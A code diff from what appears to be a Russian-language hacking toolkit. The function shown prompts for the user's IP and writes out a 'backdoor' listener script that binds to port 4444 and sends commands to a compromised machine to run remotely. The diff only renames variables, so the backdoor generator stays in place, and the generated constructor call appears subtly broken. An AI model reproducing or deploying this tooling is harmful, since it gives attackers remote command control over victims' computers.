@@ -190,9 +190,9 @@ def DefSec4():
 		def BackdoorS():
 			os.chdir('USER-BD')
 			ip = input('Введите свой IP')
-			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
-			n = open(f,"w",encoding='utf-8')
-			n.write("""import socket, json
+			v = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
+			k = open(v,"w",encoding='utf-8')
+			k.write("""import socket, json
 #Хакер
 class Listener:
 	def __init__(self, ip, port):
@@ -233,7 +233,7 @@ class Listener:
 			result = self.execute_remotely(command)
 			print(result)
 my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
-my_listener.go() """	n.close()
+my_listener.go() """	k.close()
 			print('Готово')
 			break
 				
